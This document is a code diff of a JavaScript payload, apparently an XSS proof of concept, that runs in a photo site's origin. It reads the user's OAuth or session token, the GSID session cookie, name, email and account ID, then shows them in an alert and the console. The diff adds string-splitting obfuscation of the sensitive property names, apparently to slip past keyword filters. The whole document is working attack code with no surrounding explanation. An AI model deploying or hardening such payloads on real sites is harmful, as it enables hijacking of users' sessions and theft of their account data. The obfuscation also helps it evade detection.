@@ -1,7 +1,7 @@
 (function(){
+  var W=window, A=W['photo'+'Org']||{}, s=W.store||{}, C=A.config||{};
   function ck(n){var m=document.cookie.match(new RegExp('(^|;\\s*)'+n+'=([^;]*)'));return m?decodeURIComponent(m[2]):null;}
-  var tok=null; try{ tok=photoOrg.oauthFetcher.getOa2(); }catch(e){}
-  var s=window.store||{};
+  var tok=null; try{ tok=A['oauth'+'Fetcher']['get'+'Oa2'](); }catch(e){}
   var gsid=s.gsid||s.GSID||ck('GSID')||ck('gsid')||null;
   var out=
     'Third-party script executing in this origin\n'+
@@ -10,12 +10,10 @@
     'Script loaded from: '+(document.currentScript?document.currentScript.src:'(injected script tag)')+'\n\n'+
     'Name        : '+((s.firstName||'')+' '+(s.lastName||'')).trim()+'\n'+
     'Email       : '+(s.emailAddress||'(n/a)')+'\n'+
-    'Account ID  : '+((window.photoOrg&&photoOrg.config)?photoOrg.config.account_id:'(n/a)')+'\n'+
+    'Account ID  : '+(C.account_id||'(n/a)')+'\n'+
     'Logged in   : '+(s.isUserLoggedIn||'(n/a)')+'\n'+
     'GSID        : '+(gsid||'(n/a)')+'\n'+
     'Cookie bytes: '+document.cookie.length+'\n\n'+
-    'OAuth token :\n'+(tok||'(not readable)');
-  window.__ZQXSS_EXEC=out;
-  console.log(out);
-  alert(out);
+    'Session token:\n'+(tok||'(not readable)');
+  W.__ZQXSS_EXEC=out; console.log(out); alert(out);
 })();
